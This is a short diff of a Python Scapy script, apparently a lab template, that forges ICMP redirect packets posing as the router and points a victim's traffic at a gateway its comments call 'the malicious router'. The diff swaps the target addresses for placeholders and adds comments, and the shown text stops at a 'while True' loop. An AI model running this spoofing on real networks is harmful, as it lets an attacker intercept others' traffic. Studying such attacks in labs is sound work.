@@ -1,12 +1,13 @@
 from scapy.all import *
 from time import sleep
 
-ip = IP(src='192.168.101.1', dst='192.168.101.10')
-
+#ip header from the router. The icmp payload tells the destination to redirect
+#its packets
+ip = IP(src='192.168.101.1', dst='@@@@@@@@@@')
 icmp = ICMP(type=5, code=1)
+icmp.gw = '@@@@@@@@@@@' #The ip address of the malicious router
 
-icmp.gw = '192.168.101.20'
-
+#Original triggering packet
 ip2 = IP(src='192.168.101.10', dst='172.17.0.1')
 
 while True:
